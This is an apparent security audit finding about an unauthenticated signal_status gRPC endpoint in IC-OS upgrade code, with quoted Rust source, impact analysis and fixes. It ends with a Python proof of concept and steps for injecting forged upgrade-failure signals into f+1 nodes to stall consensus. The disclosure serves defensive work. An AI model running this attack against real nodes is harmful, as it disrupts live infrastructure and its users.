### Title
Unauthenticated `signal_status` Endpoint in `DiskEncryptionKeyExchangeServer` Allows Any Network Peer to Abort Node Upgrades - (File: rs/ic_os/guest_upgrade/server/src/service.rs)

### Summary
The `DiskEncryptionKeyExchangeServer` in the IC-OS guest upgrade subsystem deliberately skips TLS client certificate verification (`SkipClientCertificateCheck`) and exposes a `signal_status` gRPC endpoint that performs no caller identity check. Any network-reachable peer can connect to this server and send a `SignalStatusRequest` with `success: false`, causing the upgrade orchestrator to record a failed upgrade for the targeted node. If applied to enough nodes during a coordinated upgrade window, this can prevent the subnet from reaching the required replica version, stalling consensus and blocking transaction confirmation.

### Finding Description
The `DiskEncryptionKeyExchangeServer` is started during IC-OS node upgrades. Its TLS configuration is built with `SkipClientCertificateCheck` as the `ClientCertVerifier`:

```rust
// rs/ic_os/guest_upgrade/server/src/server.rs  line 66-67
let tls_config = ServerConfig::builder_with_protocol_versions(&[&TLS13])
    .with_client_cert_verifier(Arc::new(SkipClientCertificateCheck))
```

`SkipClientCertificateCheck::verify_client_cert` unconditionally returns `Ok(ClientCertVerified::assertion())`, meaning any TLS client is accepted regardless of identity:

```rust
// rs/ic_os/guest_upgrade/server/src/tls.rs  lines 15-22
fn verify_client_cert(
    &self,
    _end_entity: &CertificateDer<'_>,
    _intermediates: &[CertificateDer<'_>],
    _now: UnixTime,
) -> Result<ClientCertVerified, Error> {
    Ok(ClientCertVerified::assertion())
}
```

The server then binds to `Ipv6Addr::UNSPECIFIED` (all interfaces) on the configured port, making it reachable from the network. The `signal_status` gRPC method performs no identity check on the connected client:

```rust
// rs/ic_os/guest_upgrade/server/src/service.rs  lines 185-211
async fn signal_status_impl(
    &self,
    request: Request<SignalStatusRequest>,
) -> Result<Response<SignalStatusResponse>, Status> {
    ...
    match request.get_ref().success {
        Some(true)  => { let _ = self.status_sender.send(Ok(())); }
        Some(false) => { let _ = self.status_sender.send(Err(format!(
            "Upgrade failed. Debug info from Upgrade VM: {debug_info}"
        ))); }
        ...
    }
    Ok(Response::new(SignalStatusResponse {}))
}
```

The `status_sender` is a `tokio::sync::watch::Sender` whose receiver is polled by the upgrade orchestrator to determine whether the GuestOS upgrade succeeded. An attacker who sends `success: false` causes the orchestrator to treat the upgrade as failed before the legitimate GuestOS has a chance to signal success.

By contrast, the `get_disk_encryption_key` endpoint on the same server does perform cryptographic attestation verification (SEV measurement check, chip-ID binding, custom-data binding), so only that endpoint is protected. `signal_status` has no equivalent guard.

### Impact Explanation
During a rolling subnet upgrade, every node runs the `DiskEncryptionKeyExchangeServer` for a short window. An attacker who can reach the upgrade port (bound on all interfaces) can:

1. Inject a `signal_status(success=false)` before the real GuestOS signals success.
2. The orchestrator records an upgrade failure and may roll back or halt the node.
3. If applied to ≥ f+1 nodes in a subnet of size 3f+1, the subnet cannot reach the threshold needed to finalize blocks at the new replica version, stalling consensus and preventing transaction confirmation.

The impact matches the target scope: **network not being able to confirm new transactions**.

### Likelihood Explanation
- The server binds to `Ipv6Addr::UNSPECIFIED`, so it is reachable on any network interface the node has, including public-facing ones unless explicitly firewalled.
- The upgrade port is deterministic and documented in the IC-OS configuration, so an attacker can predict it.
- The attack window is the duration of the upgrade process per node; coordinating across multiple nodes during a subnet-wide upgrade is feasible.
- No privileged credential, key, or governance majority is required — a plain TLS connection with any (or no) client certificate suffices.

### Recommendation
1. **Authenticate the `signal_status` caller.** The legitimate caller is the GuestOS upgrade VM. Its identity should be bound to the attestation exchange already performed in `get_disk_encryption_key`. Store the verified client TLS public key from that exchange and reject any `signal_status` call whose TLS certificate does not match.
2. **Restrict the listening interface.** Bind the server to the loopback or a dedicated internal interface rather than `Ipv6Addr::UNSPECIFIED`, limiting exposure to local or VSOCK-only communication.
3. **Add a nonce or session token.** Issue a short-lived token during the `get_disk_encryption_key` exchange and require it in `signal_status`, preventing replay or injection from unrelated peers.

### Proof of Concept

```python
# Attacker connects to the upgrade server on the known port with any TLS cert
# (SkipClientCertificateCheck accepts all) and sends a failure signal.

import grpc
import guest_upgrade_pb2
import guest_upgrade_pb2_grpc

# Any self-signed cert is accepted by the server
creds = grpc.ssl_channel_credentials(
    root_certificates=open("any_ca.pem","rb").read(),
    private_key=open("attacker_key.pem","rb").read(),
    certificate_chain=open("attacker_cert.pem","rb").read(),
)
channel = grpc.secure_channel("TARGET_NODE_IP:UPGRADE_PORT", creds)
stub = guest_upgrade_pb2_grpc.DiskEncryptionKeyExchangeServiceStub(channel)

# Signal failure — no authentication required
stub.SignalStatus(guest_upgrade_pb2.SignalStatusRequest(
    success=False,
    debug_info="injected failure"
))
# Orchestrator now records upgrade failure; node rolls back or halts.
```

**Step 1** — Identify the upgrade port from IC-OS configuration or network scan during the upgrade window.
**Step 2** — Connect with any TLS client certificate (or a self-signed one); `SkipClientCertificateCheck` accepts it.
**Step 3** — Call `SignalStatus` with `success=False` before the legitimate GuestOS does.
**Step 4** — Repeat for ≥ f+1 nodes in the target subnet to stall consensus.

---

**Root cause file references:**

`SkipClientCertificateCheck` unconditionally approves any client cert: [1](#0-0) 

Server is configured with `SkipClientCertificateCheck` and binds to all interfaces: [2](#0-1) 

`signal_status_impl` performs no caller identity check before writing to `status_sender`: [3](#0-2) 

`get_disk_encryption_key` (the protected sibling endpoint) shows what proper attestation verification looks like — `signal_status` has no equivalent: [4](#0-3)

### Citations

**File:** rs/ic_os/guest_upgrade/server/src/tls.rs (L15-22)
```rust
    fn verify_client_cert(
        &self,
        _end_entity: &CertificateDer<'_>,
        _intermediates: &[CertificateDer<'_>],
        _now: UnixTime,
    ) -> Result<ClientCertVerified, Error> {
        Ok(ClientCertVerified::assertion())
    }
```

**File:** rs/ic_os/guest_upgrade/server/src/server.rs (L66-76)
```rust
        let tls_config = ServerConfig::builder_with_protocol_versions(&[&TLS13])
            .with_client_cert_verifier(Arc::new(SkipClientCertificateCheck))
            .with_single_cert(vec![cert_der], key_der)
            .map_err(|e| {
                DiskEncryptionKeyExchangeError::ServerStartError(format!(
                    "Failed to create TLS config: {e}"
                ))
            })?;
        let tls_config = Arc::new(tls_config);

        let tcp_listener = TcpListener::bind(SocketAddr::new(Ipv6Addr::UNSPECIFIED.into(), port))
```

**File:** rs/ic_os/guest_upgrade/server/src/service.rs (L111-152)
```rust
    async fn get_disk_encryption_key_impl(
        &self,
        request: Request<GetDiskEncryptionKeyRequest>,
    ) -> Result<Response<GetDiskEncryptionKeyResponse>, Status> {
        let client_public_key = Self::client_public_key_from_request(&request)?;
        let client_attestation_package =
            request
                .into_inner()
                .sev_attestation_package
                .ok_or_else(|| {
                    Status::invalid_argument("Missing sev_attestation_package in request")
                })?;

        let mut sev_firmware = self.sev_firmware_factory.deref()()
            .map_err(|e| Status::internal(format!("Failed to create SEV firmware: {e:?}")))?;

        let custom_data = GetDiskEncryptionKeyTokenCustomData {
            client_tls_public_key: OctetStringRef::new(&client_public_key)
                .expect("Could not encode client public key"),
            server_tls_public_key: OctetStringRef::new(&self.my_public_key)
                .expect("Could not encode server public key"),
        };

        let my_attestation_package = generate_attestation_package(
            sev_firmware.as_mut(),
            &self.trusted_execution_environment_config,
            &custom_data,
        )
        .map_err(|e| Status::internal(format!("Failed to generate attestation package: {e:?}")))?;

        let my_attestation_report = *my_attestation_package.attestation_report();

        ParsedSevAttestationPackage::parse(
            client_attestation_package,
            self.sev_root_certificate_verification,
        )
        .verify_measurement(&self.expected_measurements)
        .verify_custom_data(&custom_data)
        .verify_chip_id(&[my_attestation_report.chip_id])
        .map_err(|e| {
            Status::invalid_argument(format!("Attestation report verification failed: {e:?}"))
        })?;
```

**File:** rs/ic_os/guest_upgrade/server/src/service.rs (L185-211)
```rust
    async fn signal_status_impl(
        &self,
        request: Request<SignalStatusRequest>,
    ) -> Result<Response<SignalStatusResponse>, Status> {
        let debug_info = request
            .get_ref()
            .debug_info
            .as_deref()
            .unwrap_or("No debug info.");
        match request.get_ref().success {
            Some(true) => {
                let _ = self.status_sender.send(Ok(()));
            }
            Some(false) => {
                let _ = self.status_sender.send(Err(format!(
                    "Upgrade failed. Debug info from Upgrade VM: {debug_info}"
                )));
            }
            None => {
                let _ = self.status_sender.send(Err(format!(
                    "No status in SignalStatusRequest. Debug info from Upgrade VM: {debug_info}"
                )));
            }
        }

        Ok(Response::new(SignalStatusResponse {}))
    }
```
